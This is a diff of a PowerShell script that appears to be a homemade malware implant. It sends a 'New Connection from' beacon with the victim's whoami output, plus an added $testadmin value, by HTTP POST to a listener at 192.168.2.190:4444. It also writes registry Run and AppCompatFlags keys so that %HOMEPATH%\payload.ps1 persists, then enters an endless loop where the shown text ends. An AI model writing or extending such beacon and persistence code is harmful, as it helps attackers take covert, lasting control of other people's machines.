@@ -2,11 +2,11 @@ $URIREC = "192.168.2.37:80"
 
 $URISEND = "192.168.2.37:4444"
 
-$hmal += "New Connection from "
+$hmal = "New Connection from "
 
-$hmal += whoami
+$hmal = whoami
 
-$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal -UseBasicParsing
+$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal,$testadmin -UseBasicParsing
 
 #attempt to set per
 
@@ -19,6 +19,7 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
     -Name "%HOMEPATH%\payload.ps1" `
     -Value "%HOMEPATH%\payload.ps1"
+
 
 while ($true)
 {
